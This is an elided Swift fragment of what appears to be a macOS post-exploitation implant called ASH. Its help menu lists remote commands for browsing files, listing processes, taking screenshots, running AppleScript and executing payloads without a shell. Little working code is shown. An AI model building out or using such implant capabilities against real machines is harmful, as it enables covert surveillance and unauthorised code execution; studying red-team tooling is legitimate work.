struct ASH {
    ...
    func commandFunc(command:String) {
        ...
        if progCall.count > 0 {
            ...
            case ("man;"):
                var commandResult = "The following are commands ran as API calls:\n"
                commandResult = commandResult + "mkdir; --- Make a directory in your current directory.\n"
                commandResult = commandResult + "whoami; --- Print the current user.\n"
                commandResult = commandResult + "cdr; --- Go to a single folder from your current directory.\n"
                commandResult = commandResult + "cd; --- Change directories.\n"
                commandResult = commandResult + "ls; --- List the directory.\n"
                commandResult = commandResult + "ps; --- Will list all processes not limited to user processes.\n"
                commandResult = commandResult + "strings; --- This will print the contents of a file.\n"
                commandResult = commandResult + "mv; --- Perform a mv command to move files/folders.\n"
                commandResult = commandResult + "cp; --- Copy a file/folder.\n"
                commandResult = commandResult + "screenshot; <Destination> --- Take a snapshot of all screens. This will notify the user.\n"
                commandResult = commandResult + "osascript; <Code> --- This will run an Apple script.\n"
                commandResult = commandResult + "execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Sometimes this works better if you're already in the directory of the payload."
                print(commandResult)
            default:
                //cd not working?
                //failsafe for processes that go on too long
                let shell = Process()
                let output = Pipe()
